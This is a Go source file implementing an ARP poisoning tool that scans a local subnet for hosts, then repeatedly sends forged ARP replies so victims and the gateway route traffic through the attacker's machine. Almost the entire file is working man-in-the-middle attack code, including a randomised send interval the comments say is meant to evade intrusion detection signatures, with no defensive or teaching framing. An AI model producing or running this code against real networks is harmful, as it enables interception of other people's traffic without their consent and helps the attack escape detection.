package dns

import (
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"sync"
	"time"
)

type ARPPoisoner struct {
	iface       *net.Interface
	attackerIP  net.IP
	attackerMAC net.HardwareAddr
	gatewayIP   net.IP
	gatewayMAC  net.HardwareAddr
	targetIPs   []net.IP
	victims     map[string]net.HardwareAddr
	mu          sync.RWMutex
	running     bool
	stopChan    chan struct{}
	interval    time.Duration
	sendFD      int
	subnet      *net.IPNet
}

type ARPConfig struct {
	Interface    string
	GatewayIP    string
	TargetIPs    []string
	IntervalSecs int
}

func NewARPPoisoner(cfg ARPConfig) (*ARPPoisoner, error) {
	iface, err := net.InterfaceByName(cfg.Interface)
	if err != nil {
		return nil, fmt.Errorf("interface '%s' not found: %w", cfg.Interface, err)
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return nil, fmt.Errorf("failed to get interface addresses: %w", err)
	}

	var attackerIP net.IP
	var subnet *net.IPNet
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && ipNet.IP.To4() != nil {
			attackerIP = ipNet.IP.To4()
			subnet = ipNet
			break
		}
	}
	if attackerIP == nil {
		return nil, fmt.Errorf("no IPv4 address found on interface %s", cfg.Interface)
	}

	gatewayIP := net.ParseIP(cfg.GatewayIP).To4()
	if gatewayIP == nil {
		return nil, fmt.Errorf("invalid gateway IP: %s", cfg.GatewayIP)
	}

	var targetIPs []net.IP
	for _, t := range cfg.TargetIPs {
		ip := net.ParseIP(t).To4()
		if ip != nil {
			targetIPs = append(targetIPs, ip)
		}
	}

	interval := time.Duration(cfg.IntervalSecs) * time.Second
	if interval == 0 {
		interval = 1 * time.Second
	}

	return &ARPPoisoner{
		iface:       iface,
		attackerIP:  attackerIP,
		attackerMAC: iface.HardwareAddr,
		gatewayIP:   gatewayIP,
		targetIPs:   targetIPs,
		victims:     make(map[string]net.HardwareAddr),
		stopChan:    make(chan struct{}),
		interval:    interval,
		sendFD:      -1,
		subnet:      subnet,
	}, nil
}

func (ap *ARPPoisoner) Start() error {
	var err error

	ap.sendFD, err = openRawSocket(ap.iface.Index)
	if err != nil {
		return fmt.Errorf("failed to open raw socket (requires root): %w", err)
	}

	ap.gatewayMAC, err = ap.resolveMAC(ap.gatewayIP)
	if err != nil {
		closeRawSocket(ap.sendFD)
		ap.sendFD = -1
		return fmt.Errorf("failed to resolve gateway MAC for %s: %w", ap.gatewayIP, err)
	}

	log.Printf("[ARP POISON] Starting on interface %s", ap.iface.Name)
	log.Printf("[ARP POISON] Attacker: %s (%s)", ap.attackerIP, ap.attackerMAC)
	log.Printf("[ARP POISON] Gateway:  %s (%s)", ap.gatewayIP, ap.gatewayMAC)

	// Always add gateway as a victim for bidirectional poisoning
	ap.mu.Lock()
	ap.victims[ap.gatewayIP.String()] = ap.gatewayMAC
	ap.mu.Unlock()

	if len(ap.targetIPs) > 0 {
		log.Printf("[ARP POISON] Targeting %d specific hosts", len(ap.targetIPs))
		for _, ip := range ap.targetIPs {
			mac, err := ap.resolveMAC(ip)
			if err != nil {
				log.Printf("[ARP] Warning: Could not resolve %s: %v", ip, err)
				continue
			}
			ap.mu.Lock()
			ap.victims[ip.String()] = mac
			ap.mu.Unlock()
			log.Printf("[ARP POISON] Victim: %s (%s)", ip, mac)
		}
	} else {
		log.Printf("[ARP POISON] Broadcast mode — discovering hosts on subnet")
		// Actively discover hosts by scanning the ARP table and sending requests
		go ap.discoverHosts()
	}

	ap.running = true

	// Send initial burst
	for i := 0; i < 5; i++ {
		ap.sendPoison()
		time.Sleep(100 * time.Millisecond)
	}

	go ap.poisonLoop()
	return nil
}

func (ap *ARPPoisoner) Stop() {
	ap.running = false
	close(ap.stopChan)

	log.Printf("[ARP] Restoring ARP caches...")
	ap.restoreARP()

	if ap.sendFD > 0 {
		closeRawSocket(ap.sendFD)
		ap.sendFD = -1
	}

	log.Printf("[ARP] ARP poisoner stopped, caches restored")
}

// discoverHosts actively scans the subnet for live hosts and adds them as victims
func (ap *ARPPoisoner) discoverHosts() {
	// First scan: read existing ARP table
	ap.scanARPTable()

	// Send ARP requests to first 254 IPs in the subnet to find hosts
	if ap.subnet != nil {
		baseIP := ap.subnet.IP.Mask(ap.subnet.Mask).To4()
		ones, bits := ap.subnet.Mask.Size()
		hostBits := bits - ones
		maxHosts := (1 << hostBits) - 2
		if maxHosts > 254 {
			maxHosts = 254
		}

		for i := 1; i <= maxHosts; i++ {
			ip := make(net.IP, 4)
			copy(ip, baseIP)
			ip[3] = baseIP[3] + byte(i)
			// Handle overflow into higher octets for larger subnets
			if ap.subnet.Mask[2] != 0xff {
				val := int(baseIP[2])<<8 + int(baseIP[3]) + i
				ip[2] = byte(val >> 8)
				ip[3] = byte(val & 0xff)
			}

			if ip.Equal(ap.attackerIP) || ip.Equal(ap.gatewayIP) {
				continue
			}
			if !ap.subnet.Contains(ip) {
				continue
			}

			ap.sendARPRequest(ip)
			time.Sleep(5 * time.Millisecond)
		}
	}

	// Wait for ARP replies to populate the cache, then scan again
	time.Sleep(2 * time.Second)
	ap.scanARPTable()

	// Periodic re-scan every 30 seconds to find new hosts
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ap.stopChan:
			return
		case <-ticker.C:
			ap.scanARPTable()
		}
	}
}

// scanARPTable reads /proc/net/arp and adds newly discovered hosts as victims
func (ap *ARPPoisoner) scanARPTable() {
	entries, err := readARPTable()
	if err != nil {
		return
	}

	ap.mu.Lock()
	defer ap.mu.Unlock()

	for ip, mac := range entries {
		parsedIP := net.ParseIP(ip).To4()
		if parsedIP == nil || parsedIP.Equal(ap.attackerIP) || parsedIP.Equal(ap.gatewayIP) {
			continue
		}
		if ap.subnet != nil && !ap.subnet.Contains(parsedIP) {
			continue
		}
		if _, exists := ap.victims[ip]; !exists {
			ap.victims[ip] = mac
			log.Printf("[ARP POISON] Discovered host: %s (%s)", ip, mac)
		}
	}
}

func (ap *ARPPoisoner) poisonLoop() {
	for {
		select {
		case <-ap.stopChan:
			return
		default:
		}

		ap.sendPoison()

		// Jittered interval: base ± 30% to avoid fixed-interval IDS signatures
		jitter := time.Duration(rand.Int63n(int64(ap.interval)*6/10)) - ap.interval*3/10
		time.Sleep(ap.interval + jitter)
	}
}

func (ap *ARPPoisoner) sendPoison() {
	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	// Always send gratuitous ARP broadcast claiming we're the gateway
	ap.sendARPReply(ap.gatewayIP, broadcastMAC, ap.gatewayIP, ap.attackerMAC)

	// Targeted poisoning for each known victim
	ap.mu.RLock()
	for ip, mac := range ap.victims {
		victimIP := net.ParseIP(ip).To4()
		if victimIP == nil {
			continue
		}

		if victimIP.Equal(ap.gatewayIP) {
			// Tell gateway: all victim traffic should come to us
			// Send with gateway's real MAC as dst so it accepts the packet
			ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, ap.attackerIP, ap.attackerMAC)
			continue
		}

		// Tell victim: "gateway is at OUR MAC"
		ap.sendARPReply(victimIP, mac, ap.gatewayIP, ap.attackerMAC)
		// Tell gateway: "victim is at OUR MAC"
		ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, victimIP, ap.attackerMAC)
	}
	ap.mu.RUnlock()
}

func (ap *ARPPoisoner) restoreARP() {
	for i := 0; i < 5; i++ {
		broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

		// Broadcast real gateway MAC
		ap.sendARPReply(ap.gatewayIP, broadcastMAC, ap.gatewayIP, ap.gatewayMAC)

		ap.mu.RLock()
		for ip, mac := range ap.victims {
			victimIP := net.ParseIP(ip).To4()
			if victimIP == nil || victimIP.Equal(ap.gatewayIP) {
				continue
			}
			ap.sendARPReply(victimIP, mac, ap.gatewayIP, ap.gatewayMAC)
			ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, victimIP, mac)
		}
		ap.mu.RUnlock()
		time.Sleep(500 * time.Millisecond)
	}
}

func (ap *ARPPoisoner) sendARPReply(dstIP net.IP, dstMAC net.HardwareAddr, spoofIP net.IP, spoofMAC net.HardwareAddr) {
	packet := make([]byte, 42)

	copy(packet[0:6], dstMAC)
	copy(packet[6:12], spoofMAC)
	binary.BigEndian.PutUint16(packet[12:14], 0x0806)

	binary.BigEndian.PutUint16(packet[14:16], 0x0001)
	binary.BigEndian.PutUint16(packet[16:18], 0x0800)
	packet[18] = 6
	packet[19] = 4
	binary.BigEndian.PutUint16(packet[20:22], 0x0002) // Reply

	copy(packet[22:28], spoofMAC)
	copy(packet[28:32], spoofIP.To4())
	copy(packet[32:38], dstMAC)
	copy(packet[38:42], dstIP.To4())

	if ap.sendFD >= 0 {
		if err := sendOnSocket(ap.sendFD, ap.iface.Index, packet); err != nil {
			log.Printf("[ARP] Send failed: %v", err)
		}
	}
}

func (ap *ARPPoisoner) sendARPRequest(targetIP net.IP) {
	packet := make([]byte, 42)
	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	copy(packet[0:6], broadcastMAC)
	copy(packet[6:12], ap.attackerMAC)
	binary.BigEndian.PutUint16(packet[12:14], 0x0806)

	binary.BigEndian.PutUint16(packet[14:16], 0x0001)
	binary.BigEndian.PutUint16(packet[16:18], 0x0800)
	packet[18] = 6
	packet[19] = 4
	binary.BigEndian.PutUint16(packet[20:22], 0x0001) // Request

	copy(packet[22:28], ap.attackerMAC)
	copy(packet[28:32], ap.attackerIP.To4())
	copy(packet[32:38], []byte{0, 0, 0, 0, 0, 0})
	copy(packet[38:42], targetIP.To4())

	if ap.sendFD >= 0 {
		sendOnSocket(ap.sendFD, ap.iface.Index, packet)
	}
}

func (ap *ARPPoisoner) resolveMAC(ip net.IP) (net.HardwareAddr, error) {
	mac, err := getARPEntry(ip)
	if err == nil {
		return mac, nil
	}

	mac, err = arpingResolve(ip, ap.iface.Name)
	if err == nil {
		return mac, nil
	}
	log.Printf("[ARP] arping failed for %s: %v, trying fallback methods", ip, err)

	if ap.sendFD >= 0 {
		for i := 0; i < 3; i++ {
			ap.sendARPRequest(ip)
			time.Sleep(500 * time.Millisecond)
			mac, err = getARPEntry(ip)
			if err == nil {
				return mac, nil
			}
		}
	}

	for attempt := 0; attempt < 3; attempt++ {
		triggerARPResolution(ip)
		time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
		mac, err = getARPEntry(ip)
		if err == nil {
			return mac, nil
		}
	}

	return nil, fmt.Errorf("could not resolve MAC for %s after all methods", ip)
}
